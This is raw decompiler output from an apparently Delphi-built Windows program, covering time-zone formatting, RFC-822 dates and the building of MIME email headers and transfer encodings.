// 41E65C: using guessed type int dword_41E65C;

//----- (00410EB4) --------------------------------------------------------
int sub_410EB4()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_410ED9;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E660;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E660: using guessed type int dword_41E660;

//----- (00410EE4) --------------------------------------------------------
void sub_410EE4()
{
  --dword_41E660;
}
// 41E660: using guessed type int dword_41E660;

//----- (00410F04) --------------------------------------------------------
_DWORD *__usercall sub_410F04@<eax>(volatile __int32 *a1@<eax>)
{
  DWORD v2; // eax
  int Bias; // ebx
  signed int v4; // eax
  unsigned int v6[2]; // [esp-Ch] [ebp-D8h] BYREF
  int *v7; // [esp-4h] [ebp-D0h]
  int v8; // [esp+Ch] [ebp-C0h] BYREF
  char v9; // [esp+10h] [ebp-BCh]
  int v10; // [esp+14h] [ebp-B8h]
  char v11; // [esp+18h] [ebp-B4h]
  char *v12; // [esp+1Ch] [ebp-B0h] BYREF
  struct _TIME_ZONE_INFORMATION TimeZoneInformation; // [esp+20h] [ebp-ACh] BYREF
  int savedregs; // [esp+CCh] [ebp+0h] BYREF

  v12 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_410FF1;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v2 = GetTimeZoneInformation(&TimeZoneInformation) - 1;
  if ( v2 )
  {
    if ( v2 == 1 )
      Bias = TimeZoneInformation.DaylightBias + TimeZoneInformation.Bias;
    else
      Bias = TimeZoneInformation.Bias;
  }
  else
  {
    Bias = TimeZoneInformation.StandardBias + TimeZoneInformation.Bias;
  }
  if ( Bias > 0 )
    sub_40351C(a1, (__int32)dword_411014);
  else
    sub_40351C(a1, (__int32)dword_411008);
  v4 = abs32(Bias);
  v8 = v4 / 60;
  v9 = 0;
  v10 = v4 % 60;
  v11 = 0;
  sub_407B2C("%.2d%.2d", (int)&v8, 1, &v12);
  sub_40372C((char **)a1, (__int32)v12);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_410FF8;
  return sub_4034C8(&v12);
}
// 411008: using guessed type int dword_411008[3];
// 411014: using guessed type int dword_411014[3];

//----- (00411110) --------------------------------------------------------
int *__userpurge sub_411110@<eax>(char **a1@<eax>, int a2, int a3)
{
  char v3; // zf
  int v4; // ebx
  __int32 *v5; // esi
  int *v6; // edi
  int v7; // ebx
  __int32 *v8; // esi
  int *v9; // edi
  int v10; // ebx
  __int32 *v11; // esi
  volatile __int32 *v12; // edi
  int v13; // ebx
  __int32 *v14; // esi
  volatile __int32 *v15; // edi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-74h] BYREF
  void *v18; // [esp-8h] [ebp-70h]
  int *v19; // [esp-4h] [ebp-6Ch]
  void *v20; // [esp+0h] [ebp-68h]
  __int32 v21; // [esp+Ch] [ebp-5Ch] BYREF
  int v22[12]; // [esp+10h] [ebp-58h] BYREF
  int v23[7]; // [esp+40h] [ebp-28h] BYREF
  __int32 *v24; // [esp+5Ch] [ebp-Ch]
  __int32 *v25; // [esp+60h] [ebp-8h]
  char **v26; // [esp+64h] [ebp-4h]
  int savedregs; // [esp+68h] [ebp+0h] BYREF

  v21 = 0;
  v26 = a1;
  sub_403B1C(v23, (char *)dword_401004, 7);
  sub_403B1C(v22, (char *)dword_401004, 12);
  v19 = &savedregs;
  v18 = &loc_4112A2;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_403834((*off_41DB38)[0], (int *)off_41D720);
  if ( v3 )
  {
    sub_408C8C("ddd, d mmm yyyy hh:mm:ss", v26, a2, a3);
  }
  else
  {
    v4 = 7;
    v5 = (__int32 *)off_41DB38;
    v6 = v23;
    v25 = (__int32 *)&off_41D720;
    do
    {
      sub_40351C(v6, *v5);
      sub_40351C(v5, *v25++);
      ++v6;
      ++v5;
      --v4;
    }
    while ( v4 );
    v7 = 12;
    v8 = (__int32 *)off_41DB5C;
    v9 = v22;
    v24 = (__int32 *)&off_41D73C;
    do
    {
      sub_40351C(v9, *v8);
      sub_40351C(v8, *v24++);
      ++v9;
      ++v8;
      --v7;
    }
    while ( v7 );
    sub_408C8C("ddd, d mmm yyyy hh:mm:ss", v26, a2, a3);
    v10 = 7;
    v11 = v23;
    v12 = (volatile __int32 *)off_41DB38;
    do
    {
      sub_40351C(v12++, *v11++);
      --v10;
    }
    while ( v10 );
    v13 = 12;
    v14 = v22;
    v15 = (volatile __int32 *)off_41DB5C;
    do
    {
      sub_40351C(v15++, *v14++);
      --v13;
    }
    while ( v13 );
  }
  sub_410F04(&v21);
  sub_4037E4((volatile __int32 *)v26, 3);
  __writefsdword(0, (unsigned int)v18);
  v20 = &loc_4112A9;
  sub_4034C8(&v21);
  sub_403BE8(v22, (char *)dword_401004, 12);
  return sub_403BE8(v23, (char *)dword_401004, 7);
}
// 411167: variable 'v3' is possibly undefined
// 401004: using guessed type int dword_401004[2];
// 41D720: using guessed type int (*off_41D720)[21];
// 41D73C: using guessed type int (*off_41D73C)[34];
// 41DB38: using guessed type int (*off_41DB38)[6];
// 41DB5C: using guessed type int (*off_41DB5C)[11];
// 411110: using guessed type int var_28[7];
// 411110: using guessed type int var_58[12];

//----- (004112E4) --------------------------------------------------------
int __usercall sub_4112E4@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>, char **a3@<ecx>)
{
  int v4; // eax
  unsigned int v6[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v7; // [esp-4h] [ebp-18h]
  char *v8; // [esp+8h] [ebp-Ch] BYREF
  _BYTE *v9; // [esp+Ch] [ebp-8h]
  _BYTE *v10; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = 0;
  v9 = a2;
  v10 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v9);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41136E;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v4 = (int)sub_4039B4(v9, v10);
  if ( v4 >= 1 )
  {
    sub_40392C((int)v10, 1, v4 - 1, &v8);
    sub_406E9C((int)v8, a3);
  }
  else
  {
    sub_406E9C((int)v10, a3);
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_411375;
  return sub_4034EC((int)&v8, 3);
}

//----- (0041137C) --------------------------------------------------------
int __usercall sub_41137C@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>, char **a3@<ecx>)
{
  _BYTE *v4; // ebx
  int v5; // eax
  unsigned int v7[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v8; // [esp-4h] [ebp-18h]
  char *v9; // [esp+8h] [ebp-Ch] BYREF
  _BYTE *v10; // [esp+Ch] [ebp-8h]
  _BYTE *v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v9 = 0;
  v10 = a2;
  v11 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v10);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4113FC;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v4 = sub_4039B4(v10, v11);
  v5 = sub_403724((int)v11);
  sub_40392C((int)v11, (int)(v4 + 1), v5 - (_DWORD)v4, &v9);
  sub_406E9C((int)v9, a3);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_411403;
  return sub_4034EC((int)&v9, 3);
}

//----- (0041140C) --------------------------------------------------------
int __usercall sub_41140C@<eax>(_BYTE *a1@<eax>, char **a2@<edx>, int a3@<ebx>)
{
  unsigned int v5[2]; // [esp-10h] [ebp-1Ch] BYREF
  int *v6; // [esp-8h] [ebp-14h]
  int v7; // [esp-4h] [ebp-10h]
  char *v8; // [esp+0h] [ebp-Ch] BYREF
  char *v9; // [esp+4h] [ebp-8h] BYREF
  _BYTE *v10; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = 0;
  v8 = 0;
  v7 = a3;
  v10 = a1;
  sub_4038D8((int)a1);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_411481;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_41137C(v10, dword_411498, &v9);
  sub_4112E4(v9, &dword_4114A4, &v8);
  sub_403560((volatile __int32 *)&v9, (__int32)v8);
  sub_406E9C((int)v9, a2);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_411488;
  return sub_4034EC((int)&v8, 3);
}
// 41140C: could not find valid save-restore pair for ebx
// 411498: using guessed type int dword_411498[3];
// 4114A4: using guessed type int dword_4114A4;

//----- (004114A8) --------------------------------------------------------
int __usercall sub_4114A8@<eax>(int *a1@<eax>, char **a2@<edx>, int a3@<ebx>)
{
  char v4; // zf
  unsigned int v6[2]; // [esp-10h] [ebp-24h] BYREF
  int *v7; // [esp-8h] [ebp-1Ch]
  int v8; // [esp-4h] [ebp-18h]
  char *v9; // [esp+0h] [ebp-14h] BYREF
  char *v10; // [esp+4h] [ebp-10h] BYREF
  char *v11; // [esp+8h] [ebp-Ch] BYREF
  char *v12; // [esp+Ch] [ebp-8h] BYREF
  int *v13; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = a3;
  v13 = a1;
  sub_4038D8((int)a1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_4115A2;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_406E9C((int)v13, &v11);
  sub_403560((volatile __int32 *)&v13, (__int32)v11);
  sub_41137C(v13, dword_4115B8, &v12);
  sub_403834((int)v12, v13);
  if ( v4 )
  {
    sub_41137C(v13, dword_4115C4, &v12);
    sub_403834((int)v12, v13);
    if ( v4 )
    {
      sub_4112E4(v13, &dword_4115DC, &v12);
      sub_403834((int)v12, v13);
      if ( v4 )
        sub_4034C8(&v12);
    }
    else
    {
      sub_4112E4(v12, dword_4115D0, &v9);
      sub_403560((volatile __int32 *)&v12, (__int32)v9);
    }
  }
  else
  {
    sub_4112E4(v12, dword_4115B8, &v10);
    sub_403560((volatile __int32 *)&v12, (__int32)v10);
  }
  sub_406E9C((int)v12, a2);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_4115A9;
  return sub_4034EC((int)&v9, 5);
}
// 4114A8: could not find valid save-restore pair for ebx
// 4114FF: variable 'v4' is possibly undefined
// 4115B8: using guessed type int dword_4115B8[3];
// 4115C4: using guessed type int dword_4115C4[3];
// 4115D0: using guessed type int dword_4115D0[3];
// 4115DC: using guessed type int dword_4115DC;

//----- (004115E0) --------------------------------------------------------
int sub_4115E0()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_411631;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E664 )
  {
    sub_403BE8((int *)&off_41D73C, (char *)dword_401004, 12);
    sub_403BE8((int *)&off_41D720, (char *)dword_401004, 7);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41D720: using guessed type int (*off_41D720)[21];
// 41D73C: using guessed type int (*off_41D73C)[34];
// 41E664: using guessed type int dword_41E664;

//----- (0041163C) --------------------------------------------------------
void sub_41163C()
{
  --dword_41E664;
}
// 41E664: using guessed type int dword_41E664;

//----- (00411838) --------------------------------------------------------
_DWORD *__usercall sub_411838@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v2 = a2;
  v3 = a1;
  sub_402BAC(a1, 0);
  v3[9] = sub_402BAC(&off_40BBB4, 1);
  v3[10] = sub_402BAC(off_40BE60, 1);
  *((_BYTE *)v3 + 19) = sub_40EEAC();
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 411846: variable 'a2' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 40BE60: using guessed type int (*off_40BE60[5])();

//----- (00411894) --------------------------------------------------------
_DWORD *__usercall sub_411894@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_402BDC((_DWORD *)v2[10]);
  sub_402BDC((_DWORD *)v5[9]);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 41189B: variable 'v3' is possibly undefined

//----- (004118CC) --------------------------------------------------------
int __usercall sub_4118CC@<eax>(int a1@<eax>)
{
  char v2; // al
  bool v3; // cf
  unsigned __int8 v4; // al
  char v5; // al
  int v6; // edi
  int v7; // esi
  int v8; // esi
  int v9; // eax
  int v10; // esi
  char v11; // al
  char v12; // al
  char v13; // al
  char v14; // al
  char v15; // al
  char v16; // al
  char v17; // al
  char v18; // al
  char v19; // al
  char v20; // al
  char v21; // al
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-4Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v24; // [esp-8h] [ebp-48h] BYREF
  int *v25; // [esp-4h] [ebp-44h]
  int *v26; // [esp+0h] [ebp-40h]
  __int32 v27; // [esp+Ch] [ebp-34h] BYREF
  __int32 v28; // [esp+10h] [ebp-30h] BYREF
  __int32 v29; // [esp+14h] [ebp-2Ch] BYREF
  __int32 v30; // [esp+18h] [ebp-28h] BYREF
  char *v31; // [esp+1Ch] [ebp-24h] BYREF
  char *v32; // [esp+20h] [ebp-20h] BYREF
  char *v33; // [esp+24h] [ebp-1Ch] BYREF
  char *v34; // [esp+28h] [ebp-18h] BYREF
  char *v35; // [esp+2Ch] [ebp-14h] BYREF
  int v36; // [esp+30h] [ebp-10h]
  char *v37; // [esp+34h] [ebp-Ch] BYREF
  char *v38; // [esp+38h] [ebp-8h] BYREF
  _DWORD *v39; // [esp+3Ch] [ebp-4h]
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  v25 = &savedregs;
  v24 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_411CD8;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v39 = sub_402BAC(&off_40BBB4, 1);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *, int *, int *))(**(_DWORD **)(a1 + 36) + 64))(
    ExceptionList,
    v24,
    v25,
    v26);
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 40) + 12))(0, 0);
  v26 = &savedregs;
  v25 = (int *)&loc_411CA9;
  v24 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v24);
  v2 = *(_BYTE *)(a1 + 16);
  v3 = v2 == 0;
  v4 = v2 - 1;
  if ( v3 )
    goto LABEL_6;
  v3 = v4 < 2u;
  v5 = v4 - 2;
  if ( v3 )
  {
    (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int *, int *))(**(_DWORD **)(a1 + 36) + 92))(
      v24,
      v25,
      v26);
    goto LABEL_23;
  }
  if ( !v5 )
  {
LABEL_6:
    if ( *(_BYTE *)(a1 + 17) == 3 )
    {
      while ( 1 )
      {
        v8 = sub_40D830(*(_DWORD *)(a1 + 40));
        if ( v8 >= sub_40D84C(*(_DWORD *)(a1 + 40)) )
          break;
        sub_4039FC(&v37, 54);
        sub_4034C8(&v38);
        v6 = (*(int (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, int *, int *))(**(_DWORD **)(a1 + 40) + 4))(
               54,
               v37,
               v24,
               v25,
               v26);
        v7 = v6;
        if ( v6 > 0 )
        {
          v36 = 1;
          do
          {
            sub_403670(&v35);
            sub_40372C(&v38, (__int32)v35);
            ++v36;
            --v7;
          }
          while ( v7 );
        }
        if ( !*(_BYTE *)(a1 + 16) )
        {
          sub_40EDA4((int)v38, *(_BYTE *)(a1 + 19), *(_BYTE *)(a1 + 18), &v34);
          sub_403560((volatile __int32 *)&v38, (__int32)v34);
        }
        sub_40F4CC((int)v38, &v33);
        sub_403560((volatile __int32 *)&v38, (__int32)v33);
        if ( v6 != 54 )
          sub_40372C(&v38, (__int32)dword_411CF0);
        (*(void (**)(void))(**(_DWORD **)(a1 + 36) + 52))();
      }
    }
    else
    {
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int *, int *))(*v39 + 92))(v24, v25, v26);
      v9 = (*(int (**)(void))(*v39 + 20))();
      if ( v9 - 1 >= 0 )
      {
        v10 = v9;
        v36 = 0;
        do
        {
          (*(void (__fastcall **)(char **, int))(*v39 + 12))(&v38, v36);
          if ( !*(_BYTE *)(a1 + 16) )
          {
            sub_40EDA4((int)v38, *(_BYTE *)(a1 + 19), *(_BYTE *)(a1 + 18), &v32);
            sub_403560((volatile __int32 *)&v38, (__int32)v32);
          }
          sub_40F3B4((int)v38, &v31);
          sub_403560((volatile __int32 *)&v38, (__int32)v31);
          (*(void (**)(void))(**(_DWORD **)(a1 + 36) + 52))();
          ++v36;
          --v10;
        }
        while ( v10 );
      }
    }
  }
LABEL_23:
  (*(void (**)(void))(**(_DWORD **)(a1 + 36) + 52))();
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 36) + 84))(0, 0);
  if ( !*(_DWORD *)(a1 + 20) )
  {
    v11 = *(_BYTE *)(a1 + 16);
    v3 = v11 == 0;
    v12 = v11 - 1;
    if ( v3 )
    {
      sub_40351C((volatile __int32 *)(a1 + 20), (__int32)"plain");
    }
    else if ( v12 )
    {
      v13 = v12 - 1;
      if ( v13 )
      {
        if ( v13 == 1 )
          sub_40351C((volatile __int32 *)(a1 + 20), (__int32)"octet-stream");
      }
      else
      {
        sub_40351C((volatile __int32 *)(a1 + 20), (__int32)"rfc822");
      }
    }
    else
    {
      sub_40351C((volatile __int32 *)(a1 + 20), (__int32)"mixed");
    }
  }
  if ( *(_DWORD *)(a1 + 24) )
  {
    sub_403770(&v30, "Content-Disposition: ", *(char **)(a1 + 24));
    (*(void (__fastcall **)(__int32, _DWORD))(**(_DWORD **)(a1 + 36) + 84))(v30, 0);
  }
  v14 = *(_BYTE *)(a1 + 17);
  v3 = v14 == 0;
  v15 = v14 - 1;
  if ( v3 )
  {
    sub_403560((volatile __int32 *)&v38, (__int32)"7bit");
  }
  else if ( v15 )
  {
    v16 = v15 - 1;
    if ( v16 )
    {
      if ( v16 == 1 )
        sub_403560((volatile __int32 *)&v38, (__int32)"base64");
    }
    else
    {
      sub_403560((volatile __int32 *)&v38, (__int32)"quoted-printable");
    }
  }
  else
  {
    sub_403560((volatile __int32 *)&v38, (__int32)"8bit");
  }
  v17 = *(_BYTE *)(a1 + 16);
  v3 = v17 == 0;
  v18 = v17 - 1;
  if ( v3 || v18 == 2 )
  {
    sub_403770(&v29, "Content-Transfer-Encoding: ", v38);
    (*(void (__fastcall **)(__int32, _DWORD))(**(_DWORD **)(a1 + 36) + 84))(v29, 0);
  }
  v19 = *(_BYTE *)(a1 + 16);
  v3 = v19 == 0;
  v20 = v19 - 1;
  if ( v3 )
  {
    ExceptionList = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
    sub_40EF00(*(_BYTE *)(a1 + 18), &v28);
    sub_4037E4((volatile __int32 *)&v38, 5);
  }
  else
  {
    if ( !v20 )
      goto LABEL_57;
    v21 = v20 - 1;
    if ( v21 )
    {
      if ( v21 != 1 )
        goto LABEL_58;
      if ( !sub_4039B4(dword_411E18, *(_BYTE **)(a1 + 32)) )
      {
        ExceptionList = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
        sub_4037E4((volatile __int32 *)&v38, 5);
        goto LABEL_58;
      }
LABEL_57:
      ExceptionList = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
      sub_4037E4((volatile __int32 *)&v38, 6);
      goto LABEL_58;
    }
    ExceptionList = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
    sub_4037E4((volatile __int32 *)&v38, 4);
  }
LABEL_58:
  sub_403770(&v27, "Content-Type: ", v38);
  (*(void (__fastcall **)(__int32, _DWORD))(**(_DWORD **)(a1 + 36) + 84))(v27, 0);
  __writefsdword(0, (unsigned int)v24);
  v26 = (int *)&loc_411CB0;
  sub_402BDC(v39);
  __writefsdword(0, (unsigned int)v24);
  v26 = (int *)&loc_411CDF;
  sub_4034EC((int)&v27, 9);
  return sub_4034EC((int)&v37, 2);
}
// 40BBB4: using guessed type void *off_40BBB4;
// 411CF0: using guessed type int dword_411CF0[3];
// 411E18: using guessed type int dword_411E18[3];

//----- (00411E58) --------------------------------------------------------
int __usercall sub_411E58@<eax>(int a1@<eax>, _BYTE *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v6; // edi
  int (**v7)[21]; // ebx
  char v8; // zf
  unsigned int v10[2]; // [esp-18h] [ebp-24h] BYREF
  int *v11; // [esp-10h] [ebp-1Ch]
  int v12; // [esp-Ch] [ebp-18h]
  int v13; // [esp-8h] [ebp-14h]
  int v14; // [esp-4h] [ebp-10h]
  char *v15; // [esp+0h] [ebp-Ch] BYREF
  char *v16; // [esp+4h] [ebp-8h] BYREF
  _BYTE *v17; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = a3;
  v13 = a5;
  v12 = a4;
  v17 = a2;
  sub_4038D8((int)a2);
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_411F2F;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_411F70(a1, 0);
  sub_4034C8((_DWORD *)(a1 + 20));
  sub_41137C(v17, dword_411F48, &v15);
  sub_406D54(v15, &v16);
  if ( !v16 )
    sub_406D54(v17, &v16);
  v6 = 16;
  v7 = &off_41D76C;
  while ( 1 )
  {
    sub_403834((int)*v7, (int *)v16);
    if ( v8 )
      break;
    v7 += 3;
    if ( !--v6 )
      goto LABEL_7;
  }
  sub_411F70(a1, v7[1]);
  sub_40351C((volatile __int32 *)(a1 + 20), (__int32)v7[2]);
LABEL_7:
  if ( !*(_DWORD *)(a1 + 4) )
    sub_411F70(a1, "application");
  if ( !*(_DWORD *)(a1 + 20) )
    sub_40351C((volatile __int32 *)(a1 + 20), (__int32)"mixed");
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_411F36;
  return sub_4034EC((int)&v15, 3);
}
// 411E58: could not find valid save-restore pair for ebx
// 411E58: could not find valid save-restore pair for edi
// 411E58: could not find valid save-restore pair for esi
// 411ED0: variable 'v8' is possibly undefined
// 411F48: using guessed type int dword_411F48[3];
// 41D76C: using guessed type int (*off_41D76C)[21];

//----- (00411F70) --------------------------------------------------------
int __usercall sub_411F70@<eax>(int a1@<eax>, _BYTE *a2@<edx>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v5; // [esp-4h] [ebp-10h]
  char *v6; // [esp+4h] [ebp-8h] BYREF
  _BYTE *v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = 0;
  v7 = a2;
  sub_4038D8((int)a2);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_412008;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_40351C((volatile __int32 *)(a1 + 4), (__int32)v7);
  sub_406D54(v7, &v6);
  *(_BYTE *)(a1 + 16) = 3;
  if ( sub_4039B4("TEXT", v6) == (_BYTE *)1 )
    *(_BYTE *)(a1 + 16) = 0;
  if ( sub_4039B4("MULTIPART", v6) == (_BYTE *)1 )
    *(_BYTE *)(a1 + 16) = 1;
  if ( sub_4039B4("MESSAGE", v6) == (_BYTE *)1 )
    *(_BYTE *)(a1 + 16) = 2;
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_41200F;
  return sub_4034EC((int)&v6, 2);
}

//----- (00412048) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__userpurge sub_412048@<eax>(
        int a1@<eax>,
        char a2@<dl>,
        char a3@<cl>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        volatile __int32 *a7)
{
  int v8; // esi
  int v9; // edi
  _DWORD v11[6]; // [esp-18h] [ebp-34h] BYREF
  __int32 v12; // [esp+0h] [ebp-1Ch] BYREF
  char *v13; // [esp+4h] [ebp-18h] BYREF
  char *v14; // [esp+8h] [ebp-14h] BYREF
  char *v15; // [esp+Ch] [ebp-10h] BYREF
  char *v16; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v17; // [esp+14h] [ebp-8h]
  int v18; // [esp+18h] [ebp-4h] BYREF
  void *savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11[5] = a4;
  v11[4] = a6;
  v11[3] = a5;
  HIBYTE(v17) = a3;
  v18 = a1;
  sub_4038D8(a1);
  v11[2] = &savedregs;
  v11[1] = &loc_412143;
  v11[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  sub_40EDA4(v18, a2, SHIBYTE(v17), &v16);
  sub_40F3B4((int)v16, &v14);
  sub_403560((volatile __int32 *)&v16, (__int32)v14);
  sub_4034C8(&v15);
  v8 = sub_403724((int)v16);
  if ( v8 > 0 )
  {
    v9 = 1;
    do
    {
      if ( v16[v9 - 1] == 32 )
      {
        sub_40372C(&v15, (__int32)dword_41215C);
      }
      else
      {
        sub_403670(&v13);
        sub_40372C(&v15, (__int32)v13);
      }
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  sub_40EF00(SHIBYTE(v17), &v12);
  sub_4037E4(a7, 5);
  __writefsdword(0, v17);
  savedregs = &loc_41214A;
  sub_4034EC((int)&v12, 5);
  return sub_4034C8(&v18);
}
// 412048: could not find valid save-restore pair for ebx
// 412048: could not find valid save-restore pair for edi
// 412048: could not find valid save-restore pair for esi
// 412135: bad sp value at call
// 41213D: bad sp value at call
// 41215C: using guessed type int dword_41215C[3];

//----- (00412184) --------------------------------------------------------
int __usercall sub_412184@<eax>(int a1@<eax>)
{
  int v1; // ebx
  int v2; // edi
  int v3; // esi
  unsigned int v5[2]; // [esp-Ch] [ebp-3Ch] BYREF
  int *v6; // [esp-4h] [ebp-34h]
  signed __int32 v7[8]; // [esp+Ch] [ebp-24h] BYREF
  int v8; // [esp+2Ch] [ebp-4h] BYREF
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v8 = a1;
  sub_4038D8(a1);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41220E;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v1 = 0;
  v2 = sub_403724(v8);
  if ( v2 > 0 )
  {
    v3 = 1;
    while ( 1 )
    {
      qmemcpy(v7, dword_412220, sizeof(v7));
      sub_402A44(v7, (char *)off_41DBFC, 32);
      if ( _bittest(v7, *(unsigned __int8 *)(v8 + v3 - 1)) )
        break;
      ++v3;
      if ( !--v2 )
        goto LABEL_6;
    }
    LOBYTE(v1) = 1;
  }
LABEL_6:
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_412215;
  sub_4034C8(&v8);
  return v1;
}
// 412220: using guessed type int dword_412220[4];
// 41DBFC: using guessed type void *off_41DBFC;

//----- (00412240) --------------------------------------------------------
_DWORD *__usercall sub_412240@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<edi>)
{
  char v4; // al
  int v5; // eax
  int v6; // ebx
  char v7; // al
  unsigned int v9[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v10; // [esp-4h] [ebp-10h]
  __int32 v11; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v11 = a1;
  sub_4038D8(a1);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_4122B8;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  if ( (unsigned __int8)sub_412184(v11) )
  {
    v4 = sub_40EEAC();
    LOBYTE(v5) = sub_40F230(v11, v4, 1023);
    v6 = v5;
    v7 = sub_40EEAC();
    sub_412048(v11, v7, v6, v6, a3, (int)a2, a2);
  }
  else
  {
    sub_40351C(a2, v11);
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_4122BF;
  return sub_4034C8(&v11);
}
// 412282: variable 'v5' is possibly undefined

